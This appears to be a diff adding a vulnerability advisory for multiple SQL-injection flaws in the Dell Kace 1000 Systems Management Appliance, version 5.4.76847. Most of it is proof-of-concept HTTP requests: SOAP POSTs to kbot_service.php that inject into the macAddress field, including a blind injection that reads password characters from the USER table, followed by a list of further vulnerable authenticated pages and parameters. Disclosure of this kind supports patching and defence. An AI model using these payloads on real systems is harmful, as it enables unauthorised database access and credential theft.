@@ -1,0 +1,57 @@
+source: http://www.securityfocus.com/bid/65029/info
+
+Dell Kace 1000 Systems Management Appliance is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Dell Kace 1000 Systems Management Appliance 5.4.76847 is vulnerable; other versions may also be affected. 
+
+Proof of Concept
+Page: /service/kbot_service.php
+Web method: getUploadPath
+Parameter: macAddress
+PoC: Variations of the statement within in the HTTP request below introduce invalid SQL syntax resulting in a database error.
+POST /service/kbot_service.php HTTP/1.1
+Accept-Encoding: gzip,deflate
+Host: www.example.com
+SOAPAction: "urn:#getUploadPath"
+Content-Length: 543
+
+<soapenv:Envelope xmlns:xsi="http://www.example.org/2001/XMLSchema-instance" xmlns:xsd="http://www.example.org/2001/XMLSchema" xmlns:soapenv="http://example.xmlsoap.org/soap/envelope/" xmlns:urn="urn:kbot_service.wsdl">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <urn:getUploadPath soapenv:encodingStyle= "http://example.xmlsoap.org/soap/encoding/">
+         <macAddress xsi:type="xsd:string">' or '1'='1</macAddress>
+         <filename xsi:type="xsd:string">test</filename>
+      </urn:getUploadPath>
+   </soapenv:Body>
+</soapenv:Envelope>
+Page: /service/kbot_service.php
+Web method: getKBot
+Parameter: macAddress
+PoC: Variations of the statement within in the HTTP request below introduce invalid SQL syntax resulting in a database error.
+POST /service/kbot_service.php HTTP/1.1
+Accept-Encoding: gzip,deflate
+Host: www.example.com
+Content-Type: text/xml;charset=UTF-8
+SOAPAction: "urn:#getKBot"
+Content-Length: 553
+
+<soapenv:Envelope xmlns:xsi="http://www.example.org/2001/XMLSchema-instance" xmlns:xsd="http://www.example.org/2001/XMLSchema" xmlns:soapenv="http://example.xmlsoap.org/soap/envelope/" xmlns:urn="urn:kbot_service.wsdl">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <urn:getKBotConfig soapenv:encodingStyle="http://example.xmlsoap.org/soap/encoding/">
+         <macAddress xsi:type="xsd:string">' or (select ascii(substring(PASSWORD,1,1)) from USER limit 2,1) = 101 and ''='</macAddress>
+      </urn:getKBotConfig>
+   </soapenv:Body>
+</soapenv:Envelope>
+The following pages also appear to be affected by similar SQL injection weaknesses, however require authentication:
+Page: /userui/advisory_detail.php
+PoC: http://www.example.com/userui/advisory_detail.php?ID=9-2
+Notes: Requires Authentication
+Page: /userui/ticket_list.php?SEARCH_SELECTION=any&ORDER[]=ID
+Parameter: ORDER[]
+Notes: Requires Authentication
+Page: /userui/ticket.php?ID=86
+Parameter: ID
+Notes: Requires Authentication
